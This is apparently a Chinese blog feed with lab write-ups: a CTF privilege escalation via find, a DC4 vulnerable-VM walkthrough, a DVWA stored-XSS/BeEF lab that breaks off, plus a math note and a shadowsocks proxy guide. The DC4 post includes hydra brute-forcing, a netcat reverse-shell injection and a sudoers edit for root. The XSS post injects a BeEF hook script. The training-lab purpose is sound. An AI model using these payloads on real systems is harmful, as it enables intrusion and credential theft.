<p><img src="/2019/09/11/hacker-2/12.png" alt="12.png"></p>
<p>这个提示告诉我们最后一个flag在root目录下，我们可以利用和find相似的方法去寻找。</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">find /root</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/11/hacker-2/13.png" alt="13.png"></p>
<p>可以看到在/root目录下有最后一个flag，即thefinalflag.txt，但是我们并没有root用户权限，怎么才能查看到这个文件内容呢？</p>
<p>我们可以利用find进行提权，直接使用以下命令：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">find /root/thefinalflag.txt -<span class="hljs-built_in">type</span> f -<span class="hljs-built_in">exec</span> cat <span class="hljs-string">'&#123;&#125;'</span> \;</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/11/hacker-2/14.png" alt="14.png"></p>
<p>好了，我们终于成功了！嘿嘿嘿！</p>
]]></content>
      <categories>
        <category>软件综合训练课程</category>
      </categories>
  </entry>
  <entry>
    <title>DC4</title>
    <url>/2019/09/17/hacker-3/</url>
    <content><![CDATA[<p>软件综合训练-续<a id="more"></a></p>
<hr>
<p>开始之前需要先下载DC4虚拟机映像，请点击：<a href="http://five86.com" target="_blank" rel="noopener">DC4下载</a></p>
<p>下载后直接导入即可，别忘记将网络设置为NAT。接下来我们开始吧！</p>
<p>启动kali和DC4，已知我的kali的ip地址为<strong>192.168.73.134</strong></p>
<p>如果不知道请先通过ifconfig查看ip地址，为了便于执行命令，首先直接ssh到kali。</p>
<p><img src="/2019/09/17/hacker-3/1.png" alt="1.png"></p>
<h3 id="1-扫描局域网上的在线主机"><a href="#1-扫描局域网上的在线主机" class="headerlink" title="1. 扫描局域网上的在线主机"></a>1. <strong>扫描局域网上的在线主机</strong></h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.73.0/24</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/17/hacker-3/2.png" alt="2.png"></p>
<p>同样的，ip为.1、.2、.254的为vmware私有，由于本机为.134，则所要攻击主机为<strong>192.168.73.133</strong></p>
<h3 id="2-对目的主机进行详细扫描："><a href="#2-对目的主机进行详细扫描：" class="headerlink" title="2. 对目的主机进行详细扫描："></a>2. <strong>对目的主机进行详细扫描：</strong></h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nmap -p- -A 192.168.73.133</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/17/hacker-3/3.png" alt="3.png"></p>
<p>可以由扫描结果看出，该主机开放了22和80端口，他很可能是个web服务器，让我们通过目的主机的ip地址访问一下它的80端口看看是什么样子！</p>
<p><img src="/2019/09/17/hacker-3/4.png" alt="4.png"></p>
<h3 id="3-爆破登陆密码"><a href="#3-爆破登陆密码" class="headerlink" title="3. 爆破登陆密码"></a>3. <strong>爆破登陆密码</strong></h3><p>发现竟然是个登陆页面，让我们通过hydra爆破一下，字典用<code>/usr/share/wordlists/rockyou</code>，由于rockyou没有解压，我们先cd到该目录将其解压</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">cd</span> /usr/share/wordlists/</span><br><span class="line">gzip -d  压缩文件名</span><br></pre></td></tr></table></figure></p>
<p>之后进行密码爆破：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.73.133 http-post-form <span class="hljs-string">"/login.php:username=^USER^&amp;password=^PASS^:S=logout"</span> -F</span><br></pre></td></tr></table></figure></p>
<p>ip地址为目的主机</p>
<p><img src="/2019/09/17/hacker-3/5.png" alt="5.png"></p>
<p>爆破成功，我们得到了<strong>login: admin    password: happy</strong></p>
<p>接下来用账户密码登陆一下试试吧。</p>
<p><img src="/2019/09/17/hacker-3/6.png" alt="6.png"></p>
<p>发现有两个选项，一个Command，另一个为退出登陆，点击Command试试吧！</p>
<p><img src="/2019/09/17/hacker-3/7.png" alt="7.png"></p>
<p>点击Run，会发现相当于对目的主机发送了ls -l的命令，如下图所示：</p>
<p><img src="/2019/09/17/hacker-3/8.png" alt="8.png"></p>
<p>这就给了我们渗透进入目的主机的机会！我们可以抓取点击Run后发给目的主机的包，修改这个命令，从而渗透入目的主机，让我们开始愉快的抓包吧！</p>
<h3 id="4-抓包、改包、发包"><a href="#4-抓包、改包、发包" class="headerlink" title="4. 抓包、改包、发包"></a>4. <strong>抓包、改包、发包</strong></h3><p>既然要抓包，就要用到kali内置的Burp Suite了，打开之后显示如下：</p>
<p><img src="/2019/09/17/hacker-3/9.png" alt="9.png"></p>
<p>首先设置一下Burp和火狐浏览器的代理设置：</p>
<ul>
<li><p>Burp: Proxy-&gt;Options-&gt;点击默认的代理规则-&gt;Edit-&gt;Request handing-&gt;勾选Support invisible proxying(enable only if needed)</p>
<p>(Burp的抓包默认是开启的）</p>
</li>
<li><p>火狐浏览器代理设置：</p>
<p><img src="/2019/09/17/hacker-3/10.png" alt="10.png"></p>
</li>
</ul>
<p>  点击<strong>Preferences</strong></p>
<p>  下拉滚动条找到<strong>Network Proxy</strong>，点击Settings，如下填写：</p>
<p>  <img src="/2019/09/17/hacker-3/11.png" alt="11.png"></p>
<p>  点击OK，完成浏览器的代理设置。</p>
<p>  让我们捋一下我们的渗透过程，通过点击Run，发送包至127.0.0.1:8080，也就是本地的8080端口，由Burp截获包，修改包中的命令字段，通过Burp将包发送到目的主机。由于我们的目的是渗透入目的主机，即反向shell，因此我们首先需要用Netcat设置一个Netcat侦听器。</p>
<p>  <strong>关于反向shell工作原理如下：</strong></p>
<p>  <img src="/2019/09/17/hacker-3/12.jpg" alt="12.jpg"></p>
<p>  在此示例中，目标使用端口4444反向连接攻击主机(即我们的kali)，-e选项将bash shell发回攻击主机。所以我们只要想办法在目标主机上执行<code>nc 192.168.73.134 -e /bin/sh</code>就可以了，现在想想，是不是只要将之前发送的包中的命令字段从ls -l变成这个就可以了呢，嘿嘿嘿，既然明白了原理，just do it!</p>
<p>  首先在我们的kali上执行：</p>
<p>  <figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure></p>
<p>  接下来打开之前的火狐浏览器，点击Run，开始抓包。</p>
<p>  打开Burp，你会发现已经抓包成功了。</p>
<p>  <img src="/2019/09/17/hacker-3/13.png" alt="13.png"></p>
<p>将radio字段改成<code>nc+-nv+192.168.73.134+4444+-e+/bin/bash</code></p>
<p>ip地址为kali的ip地址。</p>
<p>之后点击<strong>Intercept is on</strong>，即发包，将包原路发出去。可以看到按钮变为<strong>Intercept is off</strong></p>
<p>看看我们的shell是不是变成了下面的样子：</p>
<p><img src="/2019/09/17/hacker-3/14.png" alt="14.png"></p>
<p>之后在shell中输入:</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">python -c <span class="hljs-string">'import pty; pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure></p>
<p>是不是成功返回了目的主机的bash shell。</p>
<h3 id="5-获取密码"><a href="#5-获取密码" class="headerlink" title="5. 获取密码"></a>5. <strong>获取密码</strong></h3><p>去到/home目录下，会看到有三个用户：charles  jim  sam</p>
<p><img src="/2019/09/17/hacker-3/15.png" alt="15.png"></p>
<p>浏览一下这几个用户目录，发现在/home/jim/backups下有一个密码字典：old-passwords.bak，既然有密码字典，我们又可以进行密码爆破啦！</p>
<p>再开一个ssh连接我们的Kali，将三个用户名保存为一个users.txt，将这个密码字典的内容复制下来保存为一个passwd.txt，这两个txt文件都是要保存在kali上的哦。</p>
<p><img src="/2019/09/17/hacker-3/16.png" alt="16.png"></p>
<p><img src="/2019/09/17/hacker-3/17.png" alt="17.png"></p>
<p>下面在新开的ssh上输入以下命令进行密码爆破：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">hydra -L users.txt -P passwd.txt 192.168.73.133 ssh</span><br></pre></td></tr></table></figure></p>
<p>ip为目的主机ip地址。</p>
<p>密码爆破结果：</p>
<p><img src="/2019/09/17/hacker-3/18.png" alt="18.png"></p>
<p>通过爆破得到 <strong>login: jim    password: jibril04</strong></p>
<p>让我们回到渗透那个ssh上，继续下面的工作。</p>
<h3 id="6-切换到jim用户"><a href="#6-切换到jim用户" class="headerlink" title="6. 切换到jim用户"></a>6. <strong>切换到jim用户</strong></h3><p>因为我们已经知道了jim的密码，所以让我们切换到jim用户浏览一下吧！</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">su jim</span><br></pre></td></tr></table></figure></p>
<p>会提示输入密码，输入之后便以jim用户权限访问目的主机。</p>
<p>在其用户目录下发现有一个mbox，cat一下：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">cat mbox</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/17/hacker-3/19.png" alt="19.png"></p>
<p>发现其在发邮件，于是我们到/var/mail目录下查看jim的邮件：</p>
<p>打开cat一下</p>
<p><img src="/2019/09/17/hacker-3/20.png" alt="20.png"></p>
<p>发现是charles给jim发送的邮件，并向他告诉了密码：^xHhA&amp;hvim0y</p>
<p>有了charles的密码，接下来让我们切换到他的用户权限下看一看。</p>
<h3 id="7-切换到charles用户"><a href="#7-切换到charles用户" class="headerlink" title="7. 切换到charles用户"></a>7. <strong>切换到charles用户</strong></h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure></p>
<p>看一下charles的用户权限：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/17/hacker-3/21.png" alt="21.png"></p>
<p>发现<code>/usr/bin/teehee</code> 可以使用sudo </p>
<p>看一下teehee的帮助内容</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">/usr/bin/teehee --h</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/17/hacker-3/22.png" alt="22.png"></p>
<p>我也没看出什么名堂来，应该是可以写文件之类的…</p>
<p>接下来这一步我没有搞懂，看懂的小伙伴私信我一下哦，</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"charles ALL=(ALL:ALL) ALL"</span> | sudo teehee -a /etc/sudoers</span><br></pre></td></tr></table></figure></p>
<p>最后cat一下/root/目录下的flag.txt就可以了</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo cat /root/flag.txt</span><br></pre></td></tr></table></figure></p>
<p><img src="/2019/09/17/hacker-3/23.png" alt="23.png"></p>
<p>这样子就完成了！</p>
]]></content>
      <categories>
        <category>软件综合训练课程</category>
      </categories>
  </entry>
  <entry>
    <title>拉格朗日乘数法</title>
    <url>/2019/12/09/langrange-multi-approach/</url>
    <content><![CDATA[<p>在看摘要的文章中突然发现拉格朗日乘数法这个名词，觉得很熟悉但不记得具体是什么了，简单记录以备遗忘。<a id="more"></a><br>看了wiki百科后，发现原来这个用来优化的方法在大二的一门课————《最优化方法》上学过，怪不得很熟悉，而且这貌似也是大一工数的知识…大四的小废物全部忘光了，该查缺补漏继续学习了…</p>
<h3 id="一、简介-from-wiki"><a href="#一、简介-from-wiki" class="headerlink" title="一、简介(from wiki)"></a>一、简介(<em>from wiki</em>)</h3><p>在数学中的最优化问题中，拉格朗日乘数法（以数学家约瑟夫·拉格朗日命名）是一种寻找多元函数在其变量受到一个或多个条件的约束时的极值的方法。这种方法可以将一个有<strong>n</strong>个变量与<strong>k</strong>个约束条件的最优化问题转换为一个解有<strong>n + k</strong>个变量的方程组的解的问题。这种方法中引入了一个或一组新的未知数，即拉格朗日乘数，又称拉格朗日乘子，或拉氏乘子，它们是在转换后的方程，即约束方程中作为梯度（gradient）的线性组合中各个向量的系数。<br>比如，要求$f(x,y)$在$g(x,y) = c$时的最大值时，我们可以引入新变量拉格朗日乘数$\lambda$，这时我们只需要下列拉格朗日函数的极值：$\mathcal{L}(x,y,\lambda)=f(x,y)+\lambda \cdot {\Big (}g(x,y)-c{\Big )}$<br>更一般的，对含有n个变量和k个约束的情况，有：<br>$\mathcal{L}(x_{1},\ldots,x_{n},\lambda_{1},\ldots,\lambda_{k}) = f(x_{1},\ldots ,x_{n})-\sum \limits_{i=1}^{k}\lambda_{i}g_{i}(x_{1},\ldots,x_{n})$，<br><strong>拉格朗日乘数法所得的极点会包含原问题的所有极值点，但并不保证每个极值点都是原问题的极值点。</strong>拉格朗日乘数法的正确性的证明牵涉到偏微分，全微分或链法。</p>
<h3 id="二、证明"><a href="#二、证明" class="headerlink" title="二、证明"></a>二、证明</h3><p>设函数$f(x,y)$在$A$处有极值$\kappa$,且在点$A$的邻域内连续。则在点$A$处有：<br>$f(x,y) = \kappa$<br>另有一常值函数<br>$g(x,y) = c$<br>两函数在$A$点处的全微分为:<br>$\mathrm{d}f=\dfrac{\partial{f}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{f}}{\partial{y}}\mathrm{d}y = 0$<br>$\mathrm{d}g=\dfrac{\partial{g}}{\partial{x}}\mathrm{d}x + \dfrac{\partial{g}}{\partial{y}}\mathrm{d}y = 0$<br>由于齐次方程有非零解，也就是点$A$，所以该齐次方程的行列式为0，因此该线性方程组的系数成比例，有：<br>$\dfrac {\dfrac {\partial {f}}{\partial {x}}} {\dfrac {\partial {g}}{\partial {x}}} = \dfrac {\dfrac {\partial {f}}{\partial {y}}} {\dfrac {\partial {g}}{\partial {y}}} = -\lambda$<br>即：<br>$\dfrac{\partial{f}}{\partial{x}} + \lambda \dfrac{\partial{g}}{\partial{x}} = 0$</p>
<p>$\dfrac{\partial{f}}{\partial{y}} + \lambda \dfrac{\partial{g}}{\partial{y}} = 0$<br>将上二式分别乘以$\mathrm{d}x$和$\mathrm{d}y$，再相加并积分，得到一新函数<br>$\mathcal{L}(x,y,\lambda) = f(x,y) + \lambda \cdot g(x,y)$<br>那么，求原函数极值的问题就转化为求该函数极值的问题。<br>类似地，这种求极值的方法也可以推广到多维函数$f(x_{1},\ldots,x_{n})$</p>
<h3 id="三、举例"><a href="#三、举例" class="headerlink" title="三、举例"></a>三、举例</h3><p>给定椭球：$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$，求这椭球的内接最大长方体的体积。<br>这个问题实际上就是条件极值问题，即在条件$ \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} = 1$下，求$f(x,y,z) = 8xyz$的最大值。这个问题当然可以用消元法解决，但我们在这里用的是拉格朗日乘数法。<br>首先定义拉格朗日函数$\mathcal{L}(x,y,z,\lambda) = 8xyz + \lambda \cdot (\dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1)$<br>之后解变量的偏导方程，对$\mathcal{L}(x,y,z,\lambda)$求偏导得：<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{x}} = 8yz + \dfrac {2 \lambda x}{a^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{y}} = 8xz + \dfrac {2 \lambda y}{b^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{z}} = 8xy + \dfrac {2 \lambda z}{c^2} = 0$<br>$\dfrac {\partial{\mathcal{L}(x,y,z,\lambda)}} {\partial{\lambda}} = \dfrac{x^2}{a^2} + \dfrac{y^2}{b^2} + \dfrac{z^2}{c^2} - 1 = 0$<br>联立前面三个方程得到$bx = ay$和$az = cx$，带入第四个方程解得：<br>$x = \dfrac{\sqrt{3}}{3}a$  $y = \dfrac{\sqrt{3}}{3}b$  $z = \dfrac{\sqrt{3}}{3}c$<br>带入解得内接长方体的最大体积为：$V_{max} = f(\dfrac{\sqrt{3}}{3}a,\dfrac{\sqrt{3}}{3}b,\dfrac{\sqrt{3}}{3}c) = \dfrac{8\sqrt{3}}{9}abc$</p>
<h3 id="四、其他"><a href="#四、其他" class="headerlink" title="四、其他"></a>四、其他</h3><p>维基百科上的这幅图画的很直观，特转自于此<br><img src="/2019/12/09/langrange-multi-approach/Lagrange_multiplier.png" alt="1.png"><br><strong>另外，拉格朗日乘数法只能求极值，不能精确到极小值或极大值（像求导求极值一样），所以要代入试验。</strong></p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>如何使用ipv6进行校园网免流</title>
    <url>/2019/06/29/ipv6/</url>
    <content><![CDATA[<p>总结一下自己搭建ipv6服务器的过程，以防自己忘记了……<a id="more"></a></p>
<h2 id="一、购买VPS服务器"><a href="#一、购买VPS服务器" class="headerlink" title="一、购买VPS服务器"></a>一、购买VPS服务器</h2><p>VPS服务器我选择了国外的，毕竟这样子可以让我们的ss自带科学上网功能嗷，何乐而不为呢嘻嘻。<br>下面进入正题：<br>根据各位大佬们的推荐，我选择了国际知名（我也不知道它到底知不知名嘻嘻）的vultr：<a href="http://www.vultr.com/" target="_blank" rel="noopener">vultr注册地址</a></p>
<p><img src="/2019/06/29/ipv6/vultr_login.png" alt></p>
<p>注册登录后点击下图的加号就可以进行购买了（哦对前提是你的账户里要有钱…而且我买的时候vultr有充10$赠送50$的活动）支持支付宝微信支付哦！</p>
<p><img src="/2019/06/29/ipv6/2.png" alt></p>
<p>点击加号之后就可以选择服务器的类型了，你可以选择服务器的Locations，如果你希望访问Youtube快一些，那就选美国的服务器，要是你想看一些日本的小网站快一些（我也不知道是什么小网站啦）那就选择日本的服务器。我当时选择了Los Angeles的服务器…至于服务器的os嘛，ubuntu14就够了（最近看到这个网站把ubuntu14取消了，最低都是16.04了）<br>至于配置情况，选价格最低的就完事了（最低也要5$我哭）</p>
<p>选完之后一定要勾选上下图这个选项，因为我们要用ipv6嘛</p>
<p><img src="/2019/06/29/ipv6/3.png" alt></p>
<p>接下来就放心的付款就好了，vultr是按小时收费的，所以就算选错了误付款也没事，我们destroy了它重新买就好了。</p>
<p>接下来在服务器后台页面的settings选项中我们可以找到服务器的ipv6地址。在部署SSR账号时，我们就用ipv6的ip地址了，前提是我们的网络要支持ipv6喔。</p>
<h2 id="二、部署VPS服务器"><a href="#二、部署VPS服务器" class="headerlink" title="二、部署VPS服务器"></a>二、部署VPS服务器</h2><h3 id="Begin"><a href="#Begin" class="headerlink" title="Begin"></a>Begin</h3><p>写这篇blog的时候发现，我的服务器的ipv4地址被墙了（从这个月初开始同学告诉我某些vpn被封了，然后我发现我搭的vpn也崩溃了…很难过…)但是没关系！我们还有ipv6啊，你不让我用ipv4,我还可以用ipv6啊。不过首先你的网络和电脑都要支持ipv6，我们才能用ipv6进行ssh远程控制服务器。</p>
<p>ssh命令如下：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssh username@ipv6地址</span><br></pre></td></tr></table></figure></p>
<p>username默认是root，之后输入yes,windows下一定是输入yes而不是y。之后输入vultr给的默认密码(有点复杂远程之后可以修改)，这样我们就可以远程连接到了我们的服务器了！<br>为了解决这个默认的密码有点难输入的问题，ssh后的第一步我们当然是修改密码啦！输入</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">passwd</span><br></pre></td></tr></table></figure></p>
<p>之后输入你想改的密码，再确认一次就成功啦（这里的密码也是不带回显的哦）</p>
<h3 id="安装pip环境-Ubuntu"><a href="#安装pip环境-Ubuntu" class="headerlink" title="安装pip环境(Ubuntu)"></a>安装pip环境(Ubuntu)</h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">apt-get install python-pip</span><br></pre></td></tr></table></figure></p>
<h3 id="直接安装shadowsocks"><a href="#直接安装shadowsocks" class="headerlink" title="直接安装shadowsocks"></a>直接安装shadowsocks</h3><p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">pip install shadowsocks</span><br></pre></td></tr></table></figure></p>
<p>如果出现Command “python setup.py egg_info” failed错误信息，则输入</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">pip install --upgrade pip</span><br></pre></td></tr></table></figure></p>
<p>再执行上面的操作</p>
<p>如果提示没有setuptools模块，则安装setuptools</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">pip install setuptools</span><br></pre></td></tr></table></figure></p>
<p>再执行上面的操作</p>
<p>如果出现”cannot import name main”错误信息，则是因为将pip更新之后库里面的函数有所变动造成的。解决方法如下：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sudo vi /usr/bin/pip</span><br></pre></td></tr></table></figure></p>
<p>将原来的<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">from pip import main</span><br></pre></td></tr></table></figure></p>
<p>改为</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">from pip._internal import main</span><br></pre></td></tr></table></figure></p>
<p>ps:在这里我默认你会vi的操作，如果不会，请自行百度。</p>
<h3 id="配置shadowsocks-json文件"><a href="#配置shadowsocks-json文件" class="headerlink" title="配置shadowsocks.json文件"></a>配置shadowsocks.json文件</h3><p>装好shadowsocks后，我们需要在/etc/下创建一个名为shadowsocks.json的文件（其实这个json文件不叫这个名字也可以）<br>创建该文件的命令为:<br><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">vi /etc/shadowsocks.json</span><br></pre></td></tr></table></figure></p>
<p>这时我们创建一个新文件，在里面输入下图所示内容：</p>
<p><img src="/2019/06/29/ipv6/4.png" alt></p>
<p>其中的 “server”:”::” 中的”::”代表启用ipv6。<br>编辑完后，我们按esc退出编辑模式，输入 :wq 保存并退出。<br>之后再shell中输入</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">ssserver -c /etc/shadowsocks.json -d start</span><br></pre></td></tr></table></figure></p>
<p>来启动shadowsocks服务。<br>接下来在vultr网站的服务器管理页面，点击settings,如下图所示</p>
<p><img src="/2019/06/29/ipv6/8.png" alt></p>
<p>点击图中这个configuration examples 按照官网例程所示，修改/ect/network/interfaces文件</p>
<p><img src="/2019/06/29/ipv6/9.png" alt></p>
<p>这里面是我的ip地址，你要填你自己的哦，填我的是没用的啦…<br>最后重启服务器就好了！<br>重启完服务器别忘了重启shadowsocks服务嗷，如果忘记了启动命令往上面看哦~<br>（ps:我们可以利用supervisor使shadowsocks进程开机自启，具体怎么操作就自行百度一下吧嘻嘻）</p>
<p>到此，我们在服务器上的配置工作就完成了</p>
<h2 id="三、在自己PC上下载shadowsocks"><a href="#三、在自己PC上下载shadowsocks" class="headerlink" title="三、在自己PC上下载shadowsocks"></a>三、在自己PC上下载shadowsocks</h2><p>在我们自己的pc上，我们需要下载一个小飞机，也就是shadowsocks。<br>具体配置如下图所示</p>
<p><img src="/2019/06/29/ipv6/5.png" alt></p>
<p>服务器地址就是你的ipv6地址，端口是在shadowsocks.json文件中填写的端口，注意加密方式不要选错哦。之后点击确定就可以了。<br>小飞机有全局模式和PAC模式，全局就是所有的在浏览器内的网络访问全部走的代理，即通过你的ipv6网络到你的服务器，而PAC模式则是访问国内网站使用自己的本地网络ip，访问国外网站走代理。<br>下面我们测试一下，将小飞机的全局模式打开，启动系统代理，在百度中输入ip，如果会有下图显示的样子，就说明我们大功告成了！</p>
<p><img src="/2019/06/29/ipv6/6.png" alt></p>
<p>不过现在的网络速度还是太太太太慢了，如果你想提高网络速度，请继续往下看…</p>
<h2 id="四、开启BBR"><a href="#四、开启BBR" class="headerlink" title="四、开启BBR"></a>四、开启BBR</h2><p>BBR（新的TCP拥塞控制算法Bottleneck Bandwidth and RTT).<br>要开启BBR，必须要求Ubuntu的内核大于等于4.9，所以要使用这个牛逼哄哄的玩意，我们需要看一下内核是不是4.9以上。<br>查看内核命令</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure></p>
<p>如果没有高于4.9，那我们接下来需要升级内核了！<br>升级的过程也比较简单，首先我们需要确定我们服务器的系统是32位的还是64位的<br>查看命令：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">getconf LONG_BIT</span><br></pre></td></tr></table></figure></p>
<p>比如我的服务器系统是64位的，那么输入以下命令</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">wget http://kernel.ubuntu.com/~kernel-ppa/mainline/v4.10.2/linux-image-4.10.2-041002-generic_4.10.2-041002.201703120131_amd64.deb</span><br><span class="line">dpkg -i linux-image-4.10.0-041002-generic_4.10.2-041002.201703120131_amd64.deb</span><br></pre></td></tr></table></figure></p>
<p>上述命令都执行完后，就可以更新grub引导装入程序了。命令为：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">update-grub</span><br></pre></td></tr></table></figure></p>
<p>最后输入</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure></p>
<p>重启机器，我们再次用uname -a命令查看内核版本，会发现升级成功！<br>准备工作都做完了，我们可以开始开启BBR了！<br>执行以下命令：</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"net.core.default_qdisc=fq"</span> &gt;&gt; /etc/sysctl.conf</span><br><span class="line"><span class="hljs-built_in">echo</span> <span class="hljs-string">"net.ipv4.tcp_congestion_control=bbr"</span> &gt;&gt; /etc/sysctl.conf</span><br></pre></td></tr></table></figure></p>
<p>保存生效</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">sysctl -p</span><br></pre></td></tr></table></figure></p>
<p>验证是否已开启bbr:</p>
<p><figure class="highlight bash hljs"><table><tr><td class="code"><pre><span class="line">lsmod | grep bbr</span><br></pre></td></tr></table></figure></p>
<p>如果出现<img src="/2019/06/29/ipv6/7.png" alt></p>
<p>则开启成功！<br>现在开启我们的科学上网之旅吧！</p>
]]></content>
      <categories>
        <category>Daily Essays</category>
      </categories>
  </entry>
  <entry>
    <title>XSS结合Beef的社会工程学窃取密码实验</title>
    <url>/2019/09/18/hacker-4/</url>
    <content><![CDATA[<p>软件综合训练-终结篇<a id="more"></a></p>
<p>不说废话了，直接切入正题……</p>
<p>本次实验共用到老师给的kali和被攻击的win7系统。</p>
<h3 id="1-kali上的配置"><a href="#1-kali上的配置" class="headerlink" title="1. kali上的配置"></a>1. <strong>kali上的配置</strong></h3><p>首先启动虚拟机，打开kali，直接点击kali桌面的这个图标，beef就会成功启动。</p>
<p><img src="/2019/09/18/hacker-4/1.png" alt="1.png"></p>
<p>你会看到弹出一个终端如下：</p>
<p><img src="/2019/09/18/hacker-4/2.png" alt="2.png"></p>
<p>终端上显示等待倒数5…4…3…2…1…秒，之后会弹出一个页面，即是我们要用到的beef，如下所示：</p>
<p><img src="/2019/09/18/hacker-4/3.png" alt="3.png"></p>
<p><code>Uername</code>和<code>Password</code>默认都为<code>beef</code>，如果你想修改这个用户名和密码，请去修改<code>/etc/beef-xss/config.yaml</code>该配置文件中用户名和密码字段值。</p>
<p>我们输入用户名密码之后会显示如下页面：</p>
<p><img src="/2019/09/18/hacker-4/4.png" alt="4.png"></p>
<p>可以看到左边框中有两个文件夹，一个为Online Browsers，即在线主机；另一个为Offline Browsers，当然就是离线主机了。</p>
<h3 id="2-win7上的配置"><a href="#2-win7上的配置" class="headerlink" title="2. win7上的配置"></a>2. <strong>win7上的配置</strong></h3><p>开启win7虚拟机，打开下图的这个软件：</p>
<p><img src="/2019/09/18/hacker-4/5.png" alt="5.png"></p>
<p>如果提示系统没有什么VC11之类的运行库，直接点击取消即可。</p>
<p>之后点击启动，如下所示：</p>
<p><img src="/2019/09/18/hacker-4/6.png" alt="6.png"></p>
<p>到这里win7的配置基本完成，别忘了你的win7的ip地址，如果不记得了就在dos中输入ipconfig查看。</p>
<p><img src="/2019/09/18/hacker-4/7.png" alt="7.png"></p>
<p>如图所示，我的win7的ip地址为192.168.73.129</p>
<h3 id="3-继续回到我们kali上"><a href="#3-继续回到我们kali上" class="headerlink" title="3. 继续回到我们kali上"></a>3. <strong>继续回到我们kali上</strong></h3><p>再开一个页面，在url搜索框中输入win7的ip地址，会打开一个新的的登陆框，</p>
<p><img src="/2019/09/18/hacker-4/9.png" alt="9.png"></p>
<p>用户名为admin，密码为password。登陆之后显示如下：</p>
<p><img src="/2019/09/18/hacker-4/8.png" alt="8.png"></p>
<p>让我们下滑到最后，有一个<strong>DVWA Security</strong>选项，从impossible改为low，不然永远成功不了，修改之后点击Submit提交。</p>
<p>选择左边菜单栏的XSS(Stored)选项，Name字段值随便填写一个，比如我填写111，Message字段如下填写：</p>
<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>你可以在这行代码前面添加一个输出，比如输出<code>hello</code>:</p>
<p><figure class="highlight html hljs"><table><tr><td class="code"><pre><span class="line">hello<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"http://192.168.73.137:3000/hook.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>当你复制我这行代码的时候，如果细心的话，你会发现，卧槽复制上去根本少了一些代码啊！</p>
<p><img src="/2019/09/18/hacker-4/10.png" alt="10.png"></p>
